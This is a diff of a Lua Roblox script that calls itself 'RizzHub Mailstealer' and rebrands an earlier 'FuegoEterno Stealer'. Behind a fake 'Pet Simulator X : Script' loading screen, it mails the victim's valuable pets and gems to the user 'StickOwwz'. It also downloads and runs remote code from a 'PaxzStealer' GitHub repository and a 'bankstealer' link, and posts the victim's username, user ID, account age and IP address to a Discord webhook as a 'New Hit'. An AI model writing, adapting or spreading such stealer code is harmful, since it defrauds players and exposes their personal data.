@@ -1,52 +1,45 @@
---[[
-   ____  _         _   _       _       __  __       _ _     _             _
-  |  _ \(_)_______| | | |_   _| |__   |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __
-  | |_) | |_  /_  / |_| | | | | '_ \  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
-  |  _ <| |/ / / /|  _  | |_| | |_) | | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |
-  |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
-  
-]]--
+-- [RizzHub Mailstealer]
 
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "FuegoEterno OnTop", 
-    Titanics = {
-        Dualhook = true,
-        Intensity = 100 --%
-    },
-    Banana = {
-        Dualhook = true,
-        Intensity = 100 --%
-    },
-    Huges = {
-        Dualhook = true,
-        Intensity = 100 --%
-    },
-    Pogs = {
-        Dualhook = true,
-        Intensity = 0 --%
-    },
-    Exclusives = {
-        Dualhook = true,
-        Intensity = 0 --%
-    },
-    Events = {
-        Dualhook = true,
-        Intensity = 0 --%
-    },
-    Secrets = {
-        Dualhook = true,
-        Intensity = 0 --%
-    },
-    HC_DM_Mythics = {
-        Dualhook = true,
-        Intensity = 0 --%
-    },
-    Gems = {
-        Dualhook = true,
-        Intensity = 0 --%
-    }
+    MailMessage = "FuegoEterno OnTop",
+  Titanics = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = true,
+       Intensity = 0--%
+  },
+   Exclusives = {
+       Dualhook = true,
+       Intensity = 0--%
+  },
+   Events = {
+       Dualhook = true,
+       Intensity = 0--%
+  },
+   Secrets = {
+       Dualhook = true,
+       Intensity = 0--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = true,
+       Intensity = 0--%
+   },
+   Gems = {
+       Dualhook = true,
+       Intensity = 0--%
+  }
 }
 
 if getgenv().executed then return end
@@ -214,6 +207,15 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
+    _G.Title = "Pet Simulator X : Script"
+_G.Time = 30
+
+_G.Tip1 = "Getting Script..."
+_G.Tip2 = "Script Recieved!"
+_G.Tip3 = "Scaning Script..."
+_G.Tip4 = "Loading Script..."
+_G.Tip5 = "Almost Done!"
+
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzLoading')))()
 -- Remotes
 
@@ -749,7 +751,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("bankstealer raw link", true))()  -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1026,11 +1028,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "FeugoEterno Scriptz",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**Dumb Kid**",
-                ["url"] = "https://discord.gg/pUKMNeRwsn",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1039,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using FuegoEterno Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
